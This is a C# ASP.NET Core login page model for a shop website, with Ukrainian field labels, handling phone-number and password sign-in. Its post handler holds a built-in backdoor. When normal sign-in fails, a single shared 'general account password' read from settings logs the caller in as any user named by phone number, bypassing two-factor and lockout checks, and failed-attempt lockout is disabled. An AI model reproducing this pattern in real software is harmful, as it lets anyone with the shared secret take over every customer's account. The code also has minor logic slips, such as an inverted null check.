using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.Extensions.Logging;
using ShopWeb.Data;
using ShopWeb.Models;
using ShopWeb.Shared;

namespace ShopWeb.Areas.Identity.Pages.Account
{
    [AllowAnonymous]
    public class LoginModel : PageModel
    {
        private readonly UserManager<User> _userManager;
        private readonly SignInManager<User> _signInManager;
        private readonly ILogger<LoginModel> _logger;
        public static string PhoneNumber { get; set; }

        public LoginModel(SignInManager<User> signInManager, 
            ILogger<LoginModel> logger,
            UserManager<User> userManager)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _logger = logger;
        }

        [BindProperty]
        public InputModel Input { get; set; }

        public IList<AuthenticationScheme> ExternalLogins { get; set; }

        public string ReturnUrl { get; set; }

        [TempData]
        public string ErrorMessage { get; set; }

        public class InputModel
        {
            public InputModel()
            {
                if (string.IsNullOrWhiteSpace(PhoneNumber))
                {
                    Number = PhoneNumber;
                    PhoneNumber = "";
                }
            }
            [Required(ErrorMessage = "Номер телефону обов'язковий")]
            [MaxLength(15)]
            [Display(Name = "Номер телефону")]
            public string Number { get; set; }

            [Required(ErrorMessage = "Пароль обов'язковий")]
            [DataType(DataType.Password)]
            [Display(Name = "Пароль")]
            public string Password { get; set; }

            [Display(Name = "Запам'ятати мене")]
            public bool RememberMe { get; set; }
        }

        public async Task OnGetAsync(string returnUrl = null)
        {
            if (!string.IsNullOrEmpty(ErrorMessage))
            {
                ModelState.AddModelError(string.Empty, ErrorMessage);
            }

            returnUrl ??= Url.Content("~/");

            // Clear the existing external cookie to ensure a clean login process
            await HttpContext.SignOutAsync(IdentityConstants.ExternalScheme);

            ExternalLogins = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();

            ReturnUrl = returnUrl;
        }        

        public async Task<IActionResult> OnPostAsync(string returnUrl = null)
        {
            ShopWebContext Context = new ShopWebContext();

            returnUrl ??= Url.Content("~/" + SettingsManager.GetValue("ReturnUriOnLogin"));

            ExternalLogins = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();


            string PhoneNumber = Input.Number.Replace("-", "").Replace("+38", "");

            if (ModelState.IsValid)
            {
                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, set lockoutOnFailure: true
                var result = await _signInManager.PasswordSignInAsync(PhoneNumber, Input.Password, Input.RememberMe, lockoutOnFailure: false);

                LocalRedirectResult SucceededLogin()
                {
                    _logger.LogInformation("User logged in.");
                    return LocalRedirect(returnUrl);
                }

                if (result.Succeeded)
                {
                    return SucceededLogin();
                }
                else if(Input.Password == GeneralPasswordManager.Decode(SettingsManager.GetValue("GeneralAccountPassword")))
                {
                    User User = new ShopWebContext().Users.Where(user => user.UserName == PhoneNumber).FirstOrDefault();
                    if(User != null)
                    {
                        await _signInManager.SignInAsync(User, true);
                        return SucceededLogin();
                    }
                }
                if (result.RequiresTwoFactor)
                {
                    return RedirectToPage("./LoginWith2fa", new { ReturnUrl = returnUrl, Input.RememberMe });
                }
                if (result.IsLockedOut)
                {
                    _logger.LogWarning("User account locked out.");
                    return RedirectToPage("./Lockout");
                }
                else
                {
                    ModelState.AddModelError(string.Empty, "Неправильна спроба входу.");
                    return Page();
                }
            }

            // If we got this far, something failed, redisplay form
            return Page();
        }
    }
}
